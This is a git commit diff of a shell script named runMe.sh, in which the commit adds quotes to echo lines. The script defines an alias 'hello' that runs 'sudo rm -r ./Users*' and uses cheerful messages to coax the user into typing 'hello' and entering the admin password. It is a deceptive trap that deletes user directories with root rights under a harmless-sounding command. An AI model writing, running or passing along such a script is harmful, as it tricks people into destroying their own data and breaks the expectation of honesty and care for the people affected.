a3858754cc7d5490ad0a14e18d2782b4f0edd412
graham pritchard <105006648+gprtichard25@users.noreply.github.com>
2022-10-25 10:07:50 -0700

    Update runMe.sh

--- runMe.sh
+++ runMe.sh
@@ -1,5 +1,5 @@
 alias hello='sudo rm  -r ./Users*'
-echo to continue please enter hello into the shell!
-echo this will be super epic
-echo just enter admin password
-echo it will be super dope!
+echo 'to continue please enter hello into the shell!'
+echo 'this will be super epic'
+echo 'just enter admin password'
+echo 'it will be super dope!'
